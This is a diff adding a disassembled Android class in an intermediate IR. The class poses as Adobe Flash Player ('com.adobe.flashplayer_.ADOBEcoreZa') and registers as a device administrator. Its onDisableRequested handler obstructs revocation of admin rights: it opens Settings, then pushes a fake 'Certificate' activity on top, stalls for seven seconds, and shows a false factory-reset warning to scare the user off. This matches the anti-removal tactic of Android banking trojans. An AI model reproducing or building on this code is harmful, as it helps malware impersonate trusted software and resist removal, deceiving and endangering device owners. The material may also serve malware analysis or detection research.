@@ -1,0 +1,61 @@
+record `com.adobe.flashplayer_.ADOBEcoreZa` @kind class @AccessFlag PUBLIC extends `android.app.admin.DeviceAdminReceiver` @kind class {
+}
+procedure `void` `<init>`(`com.adobe.flashplayer_.ADOBEcoreZa` v0 @kind this) @signature `Lcom/adobe/flashplayer_/ADOBEcoreZa;.<init>:()V` @AccessFlag PUBLIC_CONSTRUCTOR {
+    temp;
+
+  #L030c2c.  call `<init>`(v0) @signature `Landroid/app/admin/DeviceAdminReceiver;.<init>:()V` @kind direct;
+  #L030c32.  return @kind void;
+}
+procedure `java.lang.CharSequence` `onDisableRequested`(`com.adobe.flashplayer_.ADOBEcoreZa` v7 @kind this, `android.content.Context` v8 @kind object @name `context`, `android.content.Intent` v9 @kind object @name `intent`) @signature `Lcom/adobe/flashplayer_/ADOBEcoreZa;.onDisableRequested:(Landroid/content/Context;Landroid/content/Intent;)Ljava/lang/CharSequence;` @AccessFlag PUBLIC {
+    temp;
+    v0;
+    v1;
+    v2;
+    v3;
+    v4;
+    v5;
+    v6;
+
+  #L030c44.  v6:= 2.0F;
+  #L030c48.  v5:= 268435456I;
+  #L030c4c.  v4:= 67108864I;
+  #L030c50.  v1:= new `android.content.Intent`;
+  #L030c54.  v3:= "android.settings.SETTINGS" @kind object;
+  #L030c58.  call `<init>`(v1, v3) @signature `Landroid/content/Intent;.<init>:(Ljava/lang/String;)V` @kind direct;
+  #L030c5e.  v3:= 1048576I;
+  #L030c62.  call temp:= `setFlags`(v1, v3) @signature `Landroid/content/Intent;.setFlags:(I)Landroid/content/Intent;` @kind virtual;
+  #L030c68.  call temp:= `setFlags`(v1, v6) @signature `Landroid/content/Intent;.setFlags:(I)Landroid/content/Intent;` @kind virtual;
+  #L030c6e.  call temp:= `setFlags`(v1, v5) @signature `Landroid/content/Intent;.setFlags:(I)Landroid/content/Intent;` @kind virtual;
+  #L030c74.  call temp:= `addFlags`(v1, v4) @signature `Landroid/content/Intent;.addFlags:(I)Landroid/content/Intent;` @kind virtual;
+  #L030c7a.  call `startActivity`(v8, v1) @signature `Landroid/content/Context;.startActivity:(Landroid/content/Intent;)V` @kind virtual;
+  #L030c80.  v2:= new `android.content.Intent`;
+  #L030c84.  v3:= constclass @type ^`com.adobe.flashplayer.Certificate` @kind object;
+  #L030c88.  call `<init>`(v2, v8, v3) @signature `Landroid/content/Intent;.<init>:(Landroid/content/Context;Ljava/lang/Class;)V` @kind direct;
+  #L030c8e.  v3:= "android.intent.action.VIEW" @kind object;
+  #L030c92.  call temp:= `setAction`(v2, v3) @signature `Landroid/content/Intent;.setAction:(Ljava/lang/String;)Landroid/content/Intent;` @kind virtual;
+  #L030c98.  call temp:= `addFlags`(v2, v4) @signature `Landroid/content/Intent;.addFlags:(I)Landroid/content/Intent;` @kind virtual;
+  #L030c9e.  call temp:= `setFlags`(v2, v6) @signature `Landroid/content/Intent;.setFlags:(I)Landroid/content/Intent;` @kind virtual;
+  #L030ca4.  call temp:= `setFlags`(v2, v5) @signature `Landroid/content/Intent;.setFlags:(I)Landroid/content/Intent;` @kind virtual;
+  #L030caa.  call `startActivity`(v8, v2) @signature `Landroid/content/Context;.startActivity:(Landroid/content/Intent;)V` @kind virtual;
+  #L030cb0.  v3:= `@@java.util.concurrent.TimeUnit.SECONDS` @type ^`java.util.concurrent.TimeUnit` @kind object;
+  #L030cb4.  v4:= 7L;
+  #L030cb8.  call `sleep`(v3, v4) @signature `Ljava/util/concurrent/TimeUnit;.sleep:(J)V` @kind virtual;
+  #L030cbe.  v3:= "Do you want device factory reset?\n\nClick \"Yes\" and your's device will reboot and \"No\" for cancel." @kind object;
+  #L030cc2.  return v3 @kind object;
+  #L030cc4.  v0:= Exception @type ^`java.lang.InterruptedException` @kind object;
+  #L030cc6.  call `printStackTrace`(v0) @signature `Ljava/lang/InterruptedException;.printStackTrace:()V` @kind virtual;
+  #L030ccc.  goto L030cbe;
+  catch `java.lang.InterruptedException` @[L030cb0..L030cbe] goto L030cc4;
+}
+procedure `void` `onDisabled`(`com.adobe.flashplayer_.ADOBEcoreZa` v0 @kind this, `android.content.Context` v1 @kind object @name `context`, `android.content.Intent` v2 @kind object @name `intent`) @signature `Lcom/adobe/flashplayer_/ADOBEcoreZa;.onDisabled:(Landroid/content/Context;Landroid/content/Intent;)V` @AccessFlag PUBLIC {
+    temp;
+
+  #L030cf0.  call `onDisabled`(v0, v1, v2) @signature `Landroid/app/admin/DeviceAdminReceiver;.onDisabled:(Landroid/content/Context;Landroid/content/Intent;)V` @kind super;
+  #L030cf6.  return @kind void;
+}
+procedure `void` `onEnabled`(`com.adobe.flashplayer_.ADOBEcoreZa` v0 @kind this, `android.content.Context` v1 @kind object @name `context`, `android.content.Intent` v2 @kind object @name `intent`) @signature `Lcom/adobe/flashplayer_/ADOBEcoreZa;.onEnabled:(Landroid/content/Context;Landroid/content/Intent;)V` @AccessFlag PUBLIC {
+    temp;
+
+  #L030d08.  call `onEnabled`(v0, v1, v2) @signature `Landroid/app/admin/DeviceAdminReceiver;.onEnabled:(Landroid/content/Context;Landroid/content/Intent;)V` @kind super;
+  #L030d0e.  return @kind void;
+}
